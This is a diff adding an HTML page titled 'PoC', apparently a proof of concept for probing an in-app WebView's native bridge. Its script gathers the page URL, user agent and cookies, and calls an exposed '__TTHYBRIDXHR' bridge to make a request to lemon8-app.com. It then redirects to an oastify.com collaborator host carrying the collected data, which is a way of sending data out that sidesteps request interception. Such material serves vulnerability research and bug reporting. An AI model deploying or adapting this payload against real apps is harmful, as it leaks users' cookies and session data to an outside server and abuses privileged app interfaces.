@@ -1,0 +1,24 @@
+<!doctype html>
+<html><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PoC</title></head>
+<body><pre id="o" style="font-size:16px;padding:10px">probing......</pre>
+<script>
+alert("start for running.");
+var L=[];
+function log(s){L.push(s);}
+log("href="+location.href);
+log("UA="+navigator.userAgent);
+log("cookie="+(document.cookie||"(empty)"));
+log("hasTTHYBRIDXHR="+(typeof window.__TTHYBRIDXHR!=="undefined"));
+log("hasWIReport="+(typeof window.WIReport!=="undefined"));
+if(typeof window.__TTHYBRIDXHR!=="undefined"){
+  try{
+    var r=window.__TTHYBRIDXHR.postMessage(JSON.stringify({method:"GET",id:"t1",url:"https://www.lemon8-app.com/",headers:{}}));
+    log("postMessage->"+r);
+  }catch(e){log("threw:"+e);}
+}else{log("bridge_absent");}
+// side channel: top-level navigation reaches our server (bypasses subresource interception)
+var s=encodeURIComponent(L.join("||"));
+setTimeout(function(){location.replace("https://5agtb3gmyewph8b0c0gywu5nrex5ly9n.oastify.com/r?d="+s);},3000);
+</script></body></html>
